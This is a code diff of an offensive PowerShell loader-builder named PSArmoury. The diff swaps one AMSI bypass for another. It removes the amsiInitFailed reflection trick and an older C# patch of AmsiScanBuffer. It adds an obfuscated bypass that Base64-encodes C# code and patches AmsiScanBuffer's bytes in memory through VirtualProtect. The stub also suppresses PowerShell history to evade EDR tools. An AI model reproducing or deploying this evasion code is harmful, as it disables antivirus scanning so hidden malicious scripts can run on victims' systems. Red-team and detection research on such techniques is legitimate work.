@@ -182,18 +182,6 @@ function Test-PSAConfig
     $IsValid
 }
 
-function Disable-AMSI
-{
-    try
-    {
-        #AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
-        (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
-    }
-    catch
-    {
-        Write-Warning "PSArmoury: Warning - AMSI bypass failed. Beware of errors due to AV detection."
-    }
-}
 
 function Get-Password([int]$Length)
 {
@@ -213,7 +201,7 @@ function Get-Password([int]$Length)
 function Write-LoaderFile($EncryptedScriptFileObjects)
 {
 
-#Shamelessly copied from the great example of @_rastamouse: https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec
+#Shamelessly copied from the great @_rastamouse: https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec
 $DLLMitigationPolicy=@"
     using System;
     using System.Diagnostics;
@@ -395,60 +383,42 @@ Add-Type -TypeDefinition `$TypeDef
 }
 "@
 
-$AMSIBypass2=@"
+$AMSIBypass=@"
+
 using System;
 using System.Runtime.InteropServices;
 
-namespace RandomNamespace
-{
-    public class RandomClass
-    {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+public class foofoo {
 
-        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        public static void RandomFunction()
-        {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
-            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
 
-            UIntPtr dwSize = (UIntPtr)5;
-            uint Zero = 0;
-         
-            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
-            Byte[] one = { 0x31 };
-            Byte[] two = { 0xff, 0x90 };
-            int length = one.Length + two.Length;
-            byte[] sum = new byte[length];
-            one.CopyTo(sum,0);
-            two.CopyTo(sum,one.Length);
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-             Marshal.Copy(sum, 0, unmanagedPointer, 3);
-             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
-        }
-    }
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
 }
 "@
-$AMSIBypass2encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass2))
+$AMSIBypassencoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass))
 
 $BypassStub=@"
-#EDR Bypass
+
+#Might help against certain EDRs...
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
-#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
-(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
+#AMSI
+`$AMSIBypassencoded = "$AMSIBypassencoded"
+`$niw32 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$AMSIBypassencoded))
+Add-Type -TypeDefinition `$niw32
+`$l = [foofoo]::LoadLibrary("am" + "si.dll")
+`$a = [foofoo]::GetProcAddress(`$l, "Amsi" + "Scan" + "Buffer")
+`$p = 0
+`$null = [foofoo]::VirtualProtect(`$a, [uint32]5, 0x40, [ref]`$p)
+`$pa = [Byte[]] (184, 87, 0, 7, 128, 195)
+[System.Runtime.InteropServices.Marshal]::Copy(`$pa, 0, `$a, 6)
 
-#AMSI Bypass 2
-`$AMSIBypass2encoded = "$AMSIBypass2encoded"
-`$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$AMSIBypass2encoded))
-Add-Type -TypeDefinition `$AMSIBypass2
-[RandomNamespace.RandomClass]::RandomFunction()
 "@
 
 if($global:3DES)
@@ -468,7 +438,9 @@ foreach(`$ef in `$EncryptedFunctions)
 `$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
 `$3DES.Mode = [System.Security.Cryptography.CipherMode]::CBC
 
-`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA1",5)
+`$v1=[Text.Encoding]::ASCII.GetBytes(`$Password)
+`$v2=[Text.Encoding]::ASCII.GetBytes(`$Salt)
+`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes(`$v1,`$v2,"SHA512",10)
 
 `$3DES.Padding = "PKCS7"
 `$3DES.KeySize = 128
@@ -495,7 +467,7 @@ try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading functi
 "@
 }
 else {
-    
+
 if($Compression)
 {    
 #This is the decryption stub used in the loader file
@@ -511,7 +483,9 @@ foreach(`$ef in `$EncryptedFunctions)
 
 `$AES = [System.Security.Cryptography.Aes]::Create()
 
-`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA256",5)
+`$v1=[Text.Encoding]::ASCII.GetBytes(`$Password)
+`$v2=[Text.Encoding]::ASCII.GetBytes(`$Salt)
+`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes(`$v1,`$v2,"SHA512",10)
 
 `$AES.Padding = "PKCS7"
 `$AES.KeySize = 256
@@ -554,7 +528,9 @@ else {
     
     `$AES = [System.Security.Cryptography.Aes]::Create()
     
-    `$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA256",5)
+    `$v1=[Text.Encoding]::ASCII.GetBytes(`$Password)
+    `$v2=[Text.Encoding]::ASCII.GetBytes(`$Salt)
+    `$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes(`$v1,`$v2,"SHA512",10)
     
     `$AES.Padding = "PKCS7"
     `$AES.KeySize = 256
@@ -1076,7 +1052,7 @@ Encrypts the message "Hello World" and returns the result as a custom psobject.
 $AES = [System.Security.Cryptography.Aes]::Create()
 
 #Derive an encryption key from the password and the salt
-$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)
+$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA512",10)
 
 #The AES instance automatically creates an IV. This is stored in a separate variable for later use.
 $IV = $AES.IV
@@ -1190,7 +1166,7 @@ $3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
 $3DES.Mode =  [System.Security.Cryptography.CipherMode]::CBC
 
 #Derive an encryption key from the password and the salt
-$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA1",5)
+$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA512",10)
 
 #The 3DES instance automatically creates an IV. This is stored in a separate variable for later use.
 $IV = $3DES.IV
